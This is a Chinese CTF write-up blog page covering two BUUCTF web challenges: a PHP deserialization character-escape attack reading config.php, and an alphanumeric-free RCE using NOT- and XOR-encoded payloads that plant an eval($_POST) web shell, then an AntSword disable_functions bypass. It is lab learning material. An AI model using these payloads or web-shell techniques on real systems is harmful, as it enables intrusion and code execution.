@@ -1,0 +1,307 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>一周CTF（三） | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="一周CTF（三） | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="ababababababababababababababa
+BUU
+[0CTF 2016]piapiapia
+首先用dirsearch扫下目录，不过buu的题目一扫就是429，所以直接查wp找到泄露的文件。
+如果要自己扫的话，可以调低线程，..." />
+    <meta name="keywords" content="CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              一周CTF（三）
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-06-28
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/mei-zhou-ctfsan.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>ababababababababababababababa</p>
+<h1 id="buu">BUU</h1>
+<h2 id="0ctf-2016piapiapia">[0CTF 2016]piapiapia</h2>
+<p>首先用dirsearch扫下目录，不过buu的题目一扫就是429，所以直接查wp找到泄露的文件。</p>
+<p>如果要自己扫的话，可以调低线程，同时设置扫描的延时：</p>
+<pre><code>python dirsearch.py -u http://403a7d8f-39ff-43e0-9fab-38981c17289f.node4.buuoj.cn:81/  -e php,htm,js,bak,zip,tgz,txt -s 1 -t 5 -i 200
+</code></pre>
+<p>找到泄露的源码<code>www.zip</code><br>
+<img src="https://skyblu3519.github.io/post-images/1687885387803.png" alt="" loading="lazy"></p>
+<p>审计源码，在<code>config.php</code>处有<code>$flag</code>，不过已经删除了。<code>profile.php</code>中有<code>unserialize</code>和<code>file_get_contents</code>，一看就是关键点。<br>
+<img src="https://skyblu3519.github.io/post-images/1687885406068.png" alt="" loading="lazy"></p>
+<p>目的是通过<code>file_get_contents</code>去读<code>config.php</code>获得flag，<code>file_get_contents</code>所读取的文件名的获取方式：<code>$profile['photo']</code>&lt;-<code>unserialize($profile)</code>&lt;-<code>$user-&gt;show_profile($username) // 查询表</code>&lt;-<code>$user-&gt;update_profile($username, serialize($profile)) // 更新表</code></p>
+<p><code>$profile</code>的获取方式<br>
+<img src="https://skyblu3519.github.io/post-images/1687885428029.png" alt="" loading="lazy"></p>
+<p><code>$user-&gt;update_profile</code>对插入数据的检查方式：<br>
+<img src="https://skyblu3519.github.io/post-images/1687885463276.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1687885472568.png" alt="" loading="lazy"></p>
+<p>文件名会被md5不可控，但是nickname没有太多的限制。关键点：对输入的check在其序列化之后，且方式为字符替换。这就是之前的反序列化字符逃逸。</p>
+<p><code>where</code>被替换为<code>hacker</code>字符串长度变长，所以可以在nickname中构造<code>photo</code>属性，再把其“挤”出来。对于<code>strlen($_POST['nickname']) &gt; 10</code>长度限制，可以通过数组绕过，不过这样<code>$profile['nickname']</code>会变成一个数组。</p>
+<pre><code class="language-php">&lt;?php
+$nick[] = 'skye';
+$profile['nickname'] = $nick;
+$profile['photo'] = '';
+$s = serialize($profile);
+echo $s.&quot;\n&quot;;       # a:2:{s:8:&quot;nickname&quot;;a:1:{i:0;s:4:&quot;skye&quot;;}s:5:&quot;photo&quot;;s:0:&quot;&quot;;}
+$safe = array('select', 'insert', 'update', 'delete', 'where');
+$safe = '/' . implode('|', $safe) . '/i';
+$s = preg_replace($safe, 'hacker', $s);
+
+$a = unserialize($s);
+print_r($a);
+//Array
+//(
+//    [nickname] =&gt; Array
+//    (
+//        [0] =&gt; 
+//        )
+//
+//    [photo] =&gt; 
+//)
+</code></pre>
+<p>为了闭合nickname的数组类型，构造所要逃逸的字符串：<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>，其长度为34，所以前面要加上34个<code>where</code>。</p>
+<pre><code class="language-php">&lt;?php
+$nick[] = 'where...where&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}';		# 34个where
+$profile['nickname'] = $nick;
+$profile['photo'] = '';
+$s = serialize($profile);
+
+$safe = array('select', 'insert', 'update', 'delete', 'where');
+$safe = '/' . implode('|', $safe) . '/i';
+$s = preg_replace($safe, 'hacker', $s);
+
+$a = unserialize($s);
+print_r($a);
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1687885513159.png" alt="" loading="lazy"></figure>
+<p>抓包修改<br>
+<img src="https://skyblu3519.github.io/post-images/1687885522616.png" alt="" loading="lazy"></p>
+<p>在<code>profile.php</code>得到base64后的<code>config.php</code>，get flag。</p>
+<h2 id="极客大挑战-2019rce-me">[极客大挑战 2019]RCE ME</h2>
+<p>关键词：无数字字母RCE。参考链接：<a href="https://blog.csdn.net/qq_61778128/article/details/127063407">无数字字母rce总结</a></p>
+<p>虽然这道题有一个长度的限制，但也差不多。</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+if(isset($_GET['code'])){
+            $code=$_GET['code'];
+                    if(strlen($code)&gt;40){
+                                        die(&quot;This is too Long.&quot;);
+                                                }
+                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){
+                                        die(&quot;NO.&quot;);
+                                                }
+                    @eval($code);
+}
+else{
+            highlight_file(__FILE__);
+}
+</code></pre>
+<p>rce的构造有两种，一个取反、一个异或。先说取反，本质上都是用PHP可变函数的特性。</p>
+<p>取反</p>
+<pre><code class="language-php">$a = urlencode(~('eval($_POST[sky])'));
+$b = urlencode(~('assert'));
+echo $a.&quot;\n&quot;;
+echo $b;
+// payload: ?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%94%86%A2%D6);
+</code></pre>
+<p>异或：</p>
+<pre><code class="language-python">valid = &quot;!@$%^*(){}[];\'\&quot;,.&lt;&gt;/?-=_`~ &quot;
+answer = 'phpinfo'
+tmp1, tmp2 = '', ''
+
+for c in answer:
+  for i in valid:
+    for j in valid:
+      if (ord(i) ^ ord(j) == ord(c)):
+        tmp1 += i
+        tmp2 += j
+        break
+    else:
+      continue
+    break
+print(&quot;tmp1为:&quot;, tmp1)
+print(&quot;tmp2为:&quot;, tmp2)
+
+# payload: ?code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27])
+</code></pre>
+<p>虽然不是很难，但还是有几个点想了很久。首先是取反的构造，这里我可以理解它最后是在<code>eval</code>中执行的是<code>('assert')('eval($_POST[sky])');</code>这样一个字符串，但没太理解第一个<code>assert</code>的括号是什么作用，为什么<code>~%9E%8C%8C%9A%8D%8B(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%94%86%A2%D6);</code>这样的payload是无效的。还有，再次提醒，<code>eval</code>不是函数，所以这里不能作为可变函数调用。</p>
+<p>在异或的构造方式中学到了，<code>${}</code>是一个变量解析的语法，用于创建动态变量名。这个语法的一般形式是<code>${expression}</code>，其中<code>expression</code>是返回字符串的任何合法 PHP 表达式。一个简单的例子：</p>
+<pre><code class="language-php">$a = 'phpinfo';
+${'a'}();
+</code></pre>
+<p>所以payload中的意思是：<code>$_GET[_]($_GET[___)</code></p>
+<p>回到题目，拿到shell之后，由于<code>disable_functions</code>的限制不能直接读到flag，要用到的方法是<code>LD_preload</code>，这个之后详细了解一下，就先记下用蚁剑的解法。</p>
+<p>右键shell，在插件市场中下载<code>绕过disable_functions</code>插件<br>
+<img src="https://skyblu3519.github.io/post-images/1687885624151.png" alt="" loading="lazy"></p>
+<p>加载插件<br>
+<img src="https://skyblu3519.github.io/post-images/1687885631124.png" alt="" loading="lazy"></p>
+<p>选择<code>PHP7_GC_UAF</code><br>
+<img src="https://skyblu3519.github.io/post-images/1687885639707.png" alt="" loading="lazy"></p>
+<p>点击开始之后，执行<code>/readflag</code><br>
+<img src="https://skyblu3519.github.io/post-images/1687885646135.png" alt="" loading="lazy"></p>
+<h1 id="总结">总结</h1>
+<p>回家真好～<br>
+<img src="https://skyblu3519.github.io/post-images/1687885754650.jpeg" alt="" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#buu">BUU</a>
+<ul>
+<li><a href="#0ctf-2016piapiapia">[0CTF 2016]piapiapia</a></li>
+<li><a href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me">[极客大挑战 2019]RCE ME</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/mei-zhou-ctf-shua-ti-zong-jie-er/">
+              <h3 class="post-title">
+                一周CTF（二）
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
